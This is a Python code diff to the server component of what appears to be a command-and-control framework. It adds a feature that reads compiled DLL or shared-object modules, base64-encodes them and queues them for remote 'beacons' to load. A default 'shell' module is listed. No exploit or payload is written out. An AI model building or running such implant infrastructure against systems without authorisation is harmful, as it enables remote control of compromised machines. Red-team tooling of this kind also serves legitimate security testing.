@@ -1,15 +1,19 @@
+import readline
 from ServerDatabase.database import DatabaseClass
 from ..utils.file_manager import FileManagerClass
 from ..global_objects import (
     command_list,
     beacon_list,
-    logger
+    logger,
+    tab_completion
 )
 
+import base64
 import uuid
 import colorama
 import json
 import traceback
+import os
 
 
 class beacon_command:
@@ -29,8 +33,8 @@ class beacon_command:
 class Beacon:
     """Handles commands within a session"""
 
-    def __init__(self, uuid, address, hostname, operating_system,
-                 last_beacon, timer, jitter, config):
+    def __init__(self, uuid: str, address: str, hostname: str, operating_system: str,
+                 last_beacon: float, timer: float, jitter: float, modules: list, config: dict):
         logger.debug(f"Creating beacon with UUID: {uuid}")
         self.uuid = uuid
         self.database = DatabaseClass(config)
@@ -51,6 +55,7 @@ class Beacon:
         self.jitter = jitter
         logger.debug(f"Beacon jitter: {jitter}")
         self.config = config
+        self.loaded_modules = modules
         colorama.init(autoreset=True)
 
     def close_connection(self, userID) -> None:
@@ -116,7 +121,7 @@ class Beacon:
 
     def systeminfo(self, userID) -> None:
         """gets the systeminfo of the client"""
-        add_beacon_command_list(userID, None, "systeminfo", "")
+        add_beacon_command_list(userID, None, "system_info", "")
         logger.debug(f"Systeminfo command added to command list for userID: {userID}")
         return
 
@@ -148,6 +153,70 @@ class Beacon:
         logger.debug(f"Listing files for userID: {userID} at path: {data}")
         self.file_manager.list_files(userID, data)
         logger.debug(f"List files for userID: {userID}")
+        
+    def load_module_beacon(self, userID) -> None:
+        command_location = self.config['server']['module_location']
+        try:
+            platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
+            ext = '.dll' if platform_folder == 'windows' else '.so'
+            module_dir = os.path.join(command_location, platform_folder)
+            files = [f for f in os.listdir(module_dir) if f.endswith(ext)]
+            module_names = [os.path.splitext(f)[0] for f in files]
+            print("Available modules:")
+            for name in module_names:
+                print(f" - {name}")
+        except Exception as e:
+            logger.error(f"Error listing modules in {command_location}: {e}")
+            print(f"Error listing modules in {command_location}: {e}")
+            return
+        readline.set_completer(
+                lambda text, state: tab_completion(text, state, list(module_names) + ["exit"]))
+        module_name = input("Enter the module name to load: ")
+        if not module_name:
+            print("No module name provided.")
+            return
+        if module_name in self.loaded_modules:
+            print(f"Module '{module_name}' is already loaded.")
+            return
+        logger.debug(f"Loading module '{module_name}' for userID: {userID}")
+        self.load_module_direct_beacon(userID, module_name)
+
+
+    def load_module_direct_beacon(self, userID, module_name) -> None:
+        """
+        Loads a module directly by its name.
+        This is used when the module is already known and does not require user input.
+        """
+        command_location = self.config['server']['module_location']
+        if "windows" in self.operating_system:
+            if "debug" in self.operating_system:
+                module_path = os.path.join(command_location, "windows", "debug", f"{module_name}.dll")
+            else:
+                module_path = os.path.join(command_location, "windows", "release", f"{module_name}.dll")
+        elif "linux" in self.operating_system:
+            if "debug" in self.operating_system:
+                module_path = os.path.join(command_location, "linux", "debug", f"{module_name}.so")
+            else:   
+                module_path = os.path.join(command_location, "linux", "release", f"{module_name}.so")
+        else:
+            logger.error(f"Unsupported operating system: {self.operating_system}")
+            print(f"Unsupported operating system: {self.operating_system}")
+            return
+        logger.debug(f"Loading module '{module_name}' for userID: {userID} from path: {module_path}")
+        try:
+            with open(module_path, "rb") as module_file:
+                file_data = module_file.read()
+                file_data = base64.b64encode(file_data).decode('utf-8')
+                add_beacon_command_list(userID, None, "module", {"name": module_name, "data": file_data})
+            logger.debug(f"Module '{module_name}' added to command list for userID: {userID}")
+            if module_name not in self.loaded_modules:
+                self.loaded_modules.append(module_name)
+        except FileNotFoundError:
+            logger.error(f"Module file '{module_path}' not found.")
+            print(f"Module file '{module_path}' not found.")
+        except Exception as e:
+            logger.error(f"Error loading module '{module_name}': {e}")
+            print(f"Error loading module '{module_name}': {e}")
 
     def list_db_commands(self, userID) -> None:
         logger.debug(f"Listing commands for userID: {userID}")
@@ -196,7 +265,7 @@ def add_beacon_list(uuid: str, r_address: str, hostname: str,
     logger.debug(f"Beacon timer: {timer}")
     logger.debug(f"Beacon jitter: {jitter}")
     new_beacon = Beacon(
-        uuid, r_address, hostname, operating_system, last_beacon, timer, jitter, config
+        uuid, r_address, hostname, operating_system, last_beacon, timer, jitter, ["shell", "close", "session"], config,
     )
     beacon_list[uuid] = new_beacon
 
